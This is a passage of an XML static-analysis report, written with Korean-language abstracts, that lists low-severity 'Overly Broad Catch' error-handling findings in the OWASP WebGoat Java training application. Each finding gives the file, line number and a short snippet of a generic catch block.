<Snippet>	    ec.addElement(new P().addElement(t));
	}
	catch (Exception e)
	{
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="4EDE1EDA647B18100E0B1C09A4204894" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UserTracker.java 줄 161의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UserTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/UserTracker.java</FilePath>
<LineStart>161</LineStart>
<Snippet>
	    }
	    catch (Exception e)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D75BA4D3DDE9F72907374515D94B516E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WsSAXInjection.java 줄 163의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WsSAXInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WsSAXInjection.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0A79E6C3C0B77328E59F107BE70A0092" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 484의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>484</LineStart>
<Snippet>	    return getIntParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="81DFC5CE3C92427364D747B77899E1E3" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>CSRF.java 줄 272의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>CSRF.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CSRF.java</FilePath>
<LineStart>272</LineStart>
<Snippet>
		}
		catch ( Exception e )
		{
			s.setMessage( "Error generating " + this.getClass().getName() );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0D9DAF652DC731796588707B181336F3" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ListStaff.java 줄 166의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/ListStaff.java</FilePath>
<LineStart>166</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employees");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A779E940407F8077AE84E33545306346" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AbstractLesson.java 줄 571의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>571</LineStart>
<Snippet>
	}
	catch (Exception e)
	{
	    // s.setMessage( "Could not find lesson plan for " +</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="DB8F3E91532A6F71FF70D8A8874CC1A9" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UncheckedEmail.java 줄 193의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UncheckedEmail.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/UncheckedEmail.java</FilePath>
<LineStart>193</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="F48D5DEEC1573C683F07A9D2D75FA9B3" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DefaultLessonAction.java 줄 323의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DefaultLessonAction.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DefaultLessonAction.java</FilePath>
<LineStart>323</LineStart>
<Snippet>			}
		}
		catch ( Exception e )
		{
			s.setMessage( "Error authorizing" );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="83052081E1308414B49D6751B206011B" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java 줄 163의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ViewProfile.java</FilePath>
<LineStart>163</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="AA8DBACBFCC199ED626C489F3B49112B" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DatabaseUtilities.java 줄 108의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DatabaseUtilities.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/DatabaseUtilities.java</FilePath>
<LineStart>108</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    e.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="5404F953C6AE612359A6D88E3907AB93" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>WeakSessionID.java 줄 135의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>WeakSessionID.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/WeakSessionID.java</FilePath>
<LineStart>135</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="41CB11DF63FB7E10B9F227139376BEF3" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>EditProfile.java 줄 186의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>EditProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/EditProfile.java</FilePath>
<LineStart>186</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="76D39C527921E5D9BD42CA8CB6EAD80D" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>StoredXss.java 줄 361의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>StoredXss.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/StoredXss.java</FilePath>
<LineStart>361</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error while getting message list.");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E2B0465C1B6BCFCD5AFCD1EFDC997BDE" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Encoding.java 줄 913의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>913</LineStart>
<Snippet>			return ( new String( bbuf.array() ) );
		}
		catch ( Exception e )
		{
			return ( "Encoding problem" );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3235E1BD2F0BD60BA0E7CDB6310F389A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>PathBasedAccessControl.java 줄 205의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>PathBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/PathBasedAccessControl.java</FilePath>
<LineStart>205</LineStart>
<Snippet>				    "&amp;lt;").replaceAll("&lt;(r|u|t)", "&amp;lt;$1")));
		}
		catch (Exception e)
		{
		    ec.addElement(new BR());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="2FC1ADCBCA06CE9C9D8DE3827ACBC8FA" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UpdateProfile.java 줄 257의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>257</LineStart>
<Snippet>
	}
	catch (Exception e)
	{
	    s.setMessage("Error updating employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D75CB48AB39051455878AB36BCC6F38B" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 120의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>120</LineStart>
<Snippet>	    return getBooleanParameter(name);
	}
	catch (Exception e)
	{
	    return def;</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="A64E1F8926C64A637FEFD0DF8A62EE5E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Login.java 줄 208의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>208</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error logging in");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="78749C5C7A8D189B06CAD56469067B08" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Encoding.java 줄 506의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>506</LineStart>
<Snippet>		}

		catch ( Exception e )
		{
</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="604163308FAF703C9E1A6A5AEE5DEB5F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>HtmlClues.java 줄 117의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>HtmlClues.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/HtmlClues.java</FilePath>
<LineStart>117</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="B7FA41764770FFADC9E67F82AD278F72" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>SummaryReportCardScreen.java 줄 99의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>SummaryReportCardScreen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/admin/SummaryReportCardScreen.java</FilePath>
<LineStart>99</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    e.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="3B1885933FB78BB851CA35EB1CB53797" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ViewProfile.java 줄 143의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ViewProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/ViewProfile.java</FilePath>
<LineStart>143</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="EB92F67E399A4E5FCA06368DD06A311D" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>DOS_Login.java 줄 175의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>DOS_Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/DOS_Login.java</FilePath>
<LineStart>175</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="BD9736D56D79C0070F7BB4F2BFCD9BD0" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Encoding.java 줄 955의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Encoding.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Encoding.java</FilePath>
<LineStart>955</LineStart>
<Snippet>			return ( URLEncoder.encode( str, "UTF-8" ) );
		}
		catch ( Exception e )
		{
			return ( "Encoding error" );</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="0901502DA54CC1A1B18743C69378FA2F" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>RoleBasedAccessControl.java 줄 454의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>RoleBasedAccessControl.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/RoleBasedAccessControl.java</FilePath>
<LineStart>454</LineStart>
<Snippet>		ue2.printStackTrace();
	    }
	    catch (Exception e)
	    {
		// All other errors send the user to the generic error page</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="CDE56C36D22512AF8987C10533A54E8A" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>XMLInjection.java 줄 126의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>XMLInjection.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/XMLInjection.java</FilePath>
<LineStart>126</LineStart>
<Snippet>	    }
	}
	catch (Exception ex)
	{
	    ex.printStackTrace();</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="8A373C74A1CD9DD2FC0BC301264BFC6E" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>LessonTracker.java 줄 262의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>LessonTracker.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/LessonTracker.java</FilePath>
<LineStart>262</LineStart>
<Snippet>		in.close();
	    }
	    catch (Exception e)
	    {}
	}</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="1BED702DBBEF5F1704FE7FED8DA8E40B" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>JavaScriptValidation.java 줄 256의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>JavaScriptValidation.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/JavaScriptValidation.java</FilePath>
<LineStart>256</LineStart>
<Snippet>	}

	catch (Exception e)
	{
	    s.setMessage("Error generating " + this.getClass().getName());</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="358503EE2CA8B429E77997BFD409A3EF" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ListStaff.java 줄 118의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ListStaff.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/ListStaff.java</FilePath>
<LineStart>118</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error getting employees");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="D28301FD8631DD232DF5C74066577BE3" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UpdateProfile.java 줄 348의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/CrossSiteScripting/UpdateProfile.java</FilePath>
<LineStart>348</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error updating employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="36D55642027CE31090EBA5A3D3DB39F8" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>AbstractLesson.java 줄 810의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>AbstractLesson.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/AbstractLesson.java</FilePath>
<LineStart>810</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error authorizing");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="552839BB1DB3EA7443664E7E62ADD640" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Challenge2Screen.java 줄 726의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Challenge2Screen.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/Challenge2Screen.java</FilePath>
<LineStart>726</LineStart>
<Snippet>	    osw.write(message);
	}
	catch (Exception e)
	{
	    System.out.println("Couldn't write " + message + " to " + s);</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="26D61725E0288E369BF8C06FCA484A17" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>UpdateProfile.java 줄 234의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>UpdateProfile.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/RoleBasedAccessControl/UpdateProfile.java</FilePath>
<LineStart>234</LineStart>
<Snippet>
	}
	catch (Exception e)
	{
	    s.setMessage("Error updating employee profile");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="E840309A0C2C9BAB18F93D662D01E1F6" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>Login.java 줄 165의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>Login.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/lessons/SQLInjection/Login.java</FilePath>
<LineStart>165</LineStart>
<Snippet>	    }
	}
	catch (Exception e)
	{
	    s.setMessage("Error logging in");</Snippet>
<TargetFunction>CatchBlock()</TargetFunction>
                            </Primary>
                        </Issue>
                        <Issue iid="FB7119AF63972CBB51F6D50AADC41469" ruleID="85E603E0-2933-4F38-851F-341604F75CB9">
                            <Category>Poor Error Handling: Overly Broad Catch</Category>
                            <Folder>Low</Folder>
                            <Kingdom>Errors</Kingdom>
                            <Abstract>ParameterParser.java 줄 882의 Catch 블록은 광범위한 예외 사항을 처리하기 때문에 프로그램의 이 시점에서 다루어서는 안 되는 상이한 사안이나 문제를 포착할 수 있습니다.</Abstract>
                            <Friority>Low</Friority>
                            <Primary>
<FileName>ParameterParser.java</FileName>
<FilePath>JavaSource/org/owasp/webgoat/session/ParameterParser.java</FilePath>
<LineStart>882</LineStart>
<Snippet>	    return getRegexParameter(name, regexpattern);
	}
	catch (Exception e)
	{
